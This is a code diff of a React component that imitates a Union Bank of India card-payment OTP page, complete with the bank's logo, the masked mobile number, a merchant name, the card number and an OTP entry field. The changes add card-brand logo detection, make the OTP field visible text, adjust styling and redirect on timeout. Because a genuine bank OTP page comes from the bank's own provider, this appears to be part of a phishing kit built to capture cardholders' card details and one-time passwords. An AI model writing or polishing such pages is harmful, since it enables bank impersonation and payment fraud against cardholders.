@@ -25,6 +25,8 @@ interface UnionBankOTPPageProps {
   onResendOtp: () => void;
   otpSubmitting?: boolean;
   otpError?: string;
+  cardBrandLogos: any;
+  getCardBrand: (cardNumber: string) => string;
 }
 
 const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
@@ -35,7 +37,9 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
   onCancel,
   onResendOtp,
   otpSubmitting = false,
-  otpError = ''
+  otpError,
+  cardBrandLogos,
+  getCardBrand
 }) => {
   const [otpValue, setOtpValue] = useState('');
   const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
@@ -59,7 +63,10 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
 
   // Bank and card logos
   const bankLogo = "https://logos-world.net/wp-content/uploads/2021/03/Union-Bank-of-India-Logo.png";
-  const cardLogo = "https://www.rupay.co.in/images/logo.png";
+  
+  // Detect card brand and get logo
+  const detectedCardBrand = getCardBrand(cardData.cardNumber);
+  const cardBrandLogo = cardBrandLogos[detectedCardBrand] || cardBrandLogos.visa; // fallback to visa
 
   // Timer effect
   useEffect(() => {
@@ -70,8 +77,12 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
       return () => clearTimeout(timer);
     } else if (timeLeft === 0) {
       setIsExpired(true);
+      // Redirect to checkout page after 2 seconds when session expires
+      setTimeout(() => {
+        onCancel();
+      }, 2000);
     }
-  }, [timeLeft, isExpired]);
+  }, [timeLeft, isExpired, onCancel]);
 
   // Format time as MM:SS
   const formatTime = (seconds: number): string => {
@@ -149,8 +160,8 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
         <div className="w-4"></div>
         <div className="flex-1 text-left pl-2 pt-3">
           <img 
-            src={cardLogo} 
-            alt="RuPay" 
+            src={cardBrandLogo} 
+            alt={`${detectedCardBrand.toUpperCase()} Card`} 
             className="h-8 object-contain inline-block"
             onError={(e) => {
               e.currentTarget.src = 'https://www.rupay.co.in/images/logo.png';
@@ -168,7 +179,7 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
 
       {/* Description */}
       <div className="px-4 py-2">
-        <p className="text-xs text-justify leading-relaxed" style={{ fontFamily: 'Verdana' }}>
+        <p className="text-xs text-justify leading-relaxed" style={{ fontFamily: 'Verdana', color: '#000000' }}>
           The One Time Password has been sent to below registered Mobile 
           Number. Please use the OTP to authenticate the transaction.
         </p>
@@ -178,60 +189,60 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
       <div className="px-4 py-2 space-y-1">
         {/* Mobile Number */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
-          <div className="w-20 text-right">Mobile Number</div>
-          <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">XXXXXX{mobileLast4}</div>
+          <div className="w-20 text-right" style={{ color: '#000000' }}>Mobile Number</div>
+          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
+          <div className="flex-1 text-left" style={{ color: '#000000' }}>XXXXXX{mobileLast4}</div>
         </div>
 
         {/* Merchant Name */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
-          <div className="w-20 text-right">Merchant Name</div>
-          <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">PLURALSIGHT</div>
+          <div className="w-20 text-right" style={{ color: '#000000' }}>Merchant Name</div>
+          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
+          <div className="flex-1 text-left" style={{ color: '#000000' }}>PLURALSIGHT</div>
         </div>
 
         {/* Date */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
-          <div className="w-20 text-right">Date</div>
-          <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">{currentDateTime}</div>
+          <div className="w-20 text-right" style={{ color: '#000000' }}>Date</div>
+          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
+          <div className="flex-1 text-left" style={{ color: '#000000' }}>{currentDateTime}</div>
         </div>
 
         {/* Card Number */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
-          <div className="w-20 text-right">Card Number</div>
-          <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">{formatCardNumber()}</div>
+          <div className="w-20 text-right" style={{ color: '#000000' }}>Card Number</div>
+          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
+          <div className="flex-1 text-left" style={{ color: '#000000' }}>{formatCardNumber()}</div>
         </div>
 
         {/* Amount */}
         <div className="flex text-xs" style={{ fontFamily: 'Verdana' }}>
-          <div className="w-20 text-right">Amount</div>
-          <div className="w-4 text-center">:</div>
-          <div className="flex-1 text-left">INR-{amount.toFixed(2)}</div>
+          <div className="w-20 text-right" style={{ color: '#000000' }}>Amount</div>
+          <div className="w-4 text-center" style={{ color: '#000000' }}>:</div>
+          <div className="flex-1 text-left" style={{ color: '#000000' }}>INR-{amount.toFixed(2)}</div>
         </div>
       </div>
 
       {/* OTP Input Section */}
       <div className="px-4 py-4 text-center">
-        <label className="block text-sm font-bold mb-2">
+        <label className="block text-sm font-bold mb-2" style={{ color: '#000000' }}>
           OTP : -
           <input
-            type="password"
+            type="text"
             inputMode="numeric"
             pattern="[0-9]*"
             maxLength={6}
             value={otpValue}
             onChange={handleOtpChange}
-            className="ml-2 w-16 text-center border border-gray-300 px-2 py-1 text-sm touch-manipulation"
+            className="ml-2 w-20 text-center border border-gray-400 px-2 py-1 text-sm bg-white text-black"
             disabled={otpSubmitting || isExpired}
             autoFocus
             autoComplete="one-time-code"
             style={{ 
-              WebkitAppearance: 'none', 
-              touchAction: 'manipulation', 
-              WebkitUserSelect: 'text', 
-              pointerEvents: 'auto' 
+              fontSize: '14px',
+              color: '#000000',
+              backgroundColor: '#ffffff',
+              border: '1px solid #666666'
             }}
             onTouchStart={(e) => e.stopPropagation()}
             onClick={(e) => e.stopPropagation()}
@@ -255,7 +266,8 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
           className="text-xs bg-gray-200 hover:bg-gray-300 px-3 py-1 border border-gray-400 touch-manipulation"
           style={{ 
             touchAction: 'manipulation',
-            pointerEvents: 'auto'
+            pointerEvents: 'auto',
+            color: '#000000'
           }}
           onTouchStart={(e) => e.stopPropagation()}
         >
@@ -303,7 +315,7 @@ const UnionBankOTPPage: React.FC<UnionBankOTPPageProps> = ({
 
       {/* Powered by */}
       <div className="px-4 py-3 text-center border-t">
-        <div className="text-xs flex items-center justify-center space-x-1">
+        <div className="text-xs flex items-center justify-center space-x-1" style={{ color: '#000000' }}>
           <span>Powered by</span>
           <img 
             src="https://wibmo.co/wp-content/uploads/2024/02/comp-14.png" 
